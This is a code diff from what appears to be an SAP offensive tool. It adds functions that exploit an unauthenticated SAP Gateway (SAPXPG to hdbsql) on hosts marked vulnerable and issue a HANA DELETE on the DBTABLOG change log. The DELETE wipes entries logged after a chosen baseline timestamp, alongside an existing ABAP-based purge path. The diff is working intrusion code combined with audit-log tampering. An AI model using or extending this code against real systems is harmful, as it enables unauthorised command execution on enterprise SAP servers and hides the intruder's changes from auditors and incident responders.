@@ -194,6 +194,108 @@ def read_baseline_timestamp(node, creds=None) -> dict:
     return result
 
 
+def _build_hana_delete_sql(base_date: str, base_time: str,
+                            tabname_filter: Optional[Iterable[str]] = None,
+                            schema: str = "SAPHANADB") -> str:
+    """Build a single-statement HANA DELETE for DBTABLOG.
+
+    Schema defaults to ``SAPHANADB`` (typical ABAP-on-HANA install).
+    Mirrors the ABAP WHERE clause exactly so the two delivery paths
+    are semantically equivalent.
+    """
+    if not _DATE_RE.match(base_date):
+        raise ValueError(f"invalid base_date: {base_date!r}")
+    if not _TIME_RE.match(base_time):
+        raise ValueError(f"invalid base_time: {base_time!r}")
+    if not re.match(r"^[A-Z0-9_]{1,64}$", schema):
+        raise ValueError(f"invalid schema: {schema!r}")
+
+    where = (f"(LOGDATE > '{base_date}' OR "
+             f"(LOGDATE = '{base_date}' AND LOGTIME > '{base_time}'))")
+
+    tabs = list(tabname_filter or [])
+    if tabs:
+        if len(tabs) > _MAX_TABNAMES:
+            raise ValueError(
+                f"tabname_filter has {len(tabs)} entries; "
+                f"max is {_MAX_TABNAMES}")
+        cleaned = []
+        for tab in tabs:
+            safe = tab.strip().upper()
+            if not re.match(r"^[A-Z0-9_/]{1,30}$", safe):
+                raise ValueError(f"invalid tabname: {tab!r}")
+            cleaned.append(safe)
+        in_list = ", ".join(f"'{t}'" for t in cleaned)
+        where += f" AND TABNAME IN ({in_list})"
+
+    return f"DELETE FROM {schema}.DBTABLOG WHERE {where}"
+
+
+def purge_dbtablog_via_gw_hdbsql(node, base_date: str, base_time: str,
+                                   tabname_filter: Optional[Iterable[str]] = None,
+                                   schema: str = "SAPHANADB") -> dict:
+    """Execute DBTABLOG DELETE via GW SAPXPG → hdbsql (HANA only).
+
+    Reuses the existing ``_execute_sql_via_gateway`` pipeline that
+    handles the P1→P2→P3→P4 unauth Gateway sequence and the
+    two-step ``write SQL to /tmp + hdbsql -I`` invocation.
+
+    Returns ``{ok, deleted_count, remaining_count, raw, error,
+    via}`` — ``deleted_count`` and ``remaining_count`` are -1 because
+    the SAPXPG response doesn't expose hdbsql stdout, so we can't
+    parse the row count from the GW path.  Success is determined by
+    the GW exit status.
+    """
+    result = {"ok": False, "deleted_count": -1, "remaining_count": -1,
+              "raw": [], "error": "", "via": "gw_hdbsql"}
+
+    db_type = (getattr(node, "db_type", "") or "").upper()
+    if db_type not in ("HDB", "HANA"):
+        result["error"] = f"GW hdbsql path is HANA-only (db_type={db_type!r})"
+        return result
+    if not getattr(node, "gw_vulnerable", False):
+        result["error"] = "node is not GW-vulnerable"
+        return result
+    gw_port = getattr(node, "gw_vulnerable_port", 0) or 3300
+    if not gw_port:
+        result["error"] = "no GW vulnerable port known"
+        return result
+
+    try:
+        sql = _build_hana_delete_sql(base_date, base_time,
+                                       tabname_filter, schema=schema)
+    except ValueError as e:
+        result["error"] = str(e)
+        return result
+
+    host = getattr(node, "ip", "") or getattr(node, "hostname", "")
+    hostname = getattr(node, "hostname", "") or host
+    sid = getattr(node, "sid", "")
+    os_type = getattr(node, "os_type", "") or "LINUX"
+    saprouter = getattr(node, "saprouter", "") or ""
+
+    try:
+        from sap_db_sql_writers import _execute_sql_via_gateway
+    except Exception as e:
+        result["error"] = f"GW SQL writer unavailable: {e}"
+        return result
+
+    try:
+        ok = _execute_sql_via_gateway(
+            host, gw_port, sid, hostname, [sql],
+            db_type="HDB", os_type=os_type, saprouter=saprouter)
+    except Exception as e:
+        result["error"] = f"GW exec raised: {e!s}"[:200]
+        return result
+
+    if not ok:
+        result["error"] = "GW SAPXPG hdbsql DELETE reported failure"
+        return result
+
+    result["ok"] = True
+    return result
+
+
 def purge_dbtablog(node, base_date: str, base_time: str,
                     tabname_filter: Optional[Iterable[str]] = None,
                     creds=None) -> dict:
@@ -209,7 +311,7 @@ def purge_dbtablog(node, base_date: str, base_time: str,
     """
     import sapmap_rfc
     result = {"ok": False, "deleted_count": 0, "remaining_count": -1,
-              "raw": [], "error": ""}
+              "raw": [], "error": "", "via": "rfc_install_and_run"}
 
     try:
         abap = _build_purge_abap(base_date, base_time, tabname_filter)
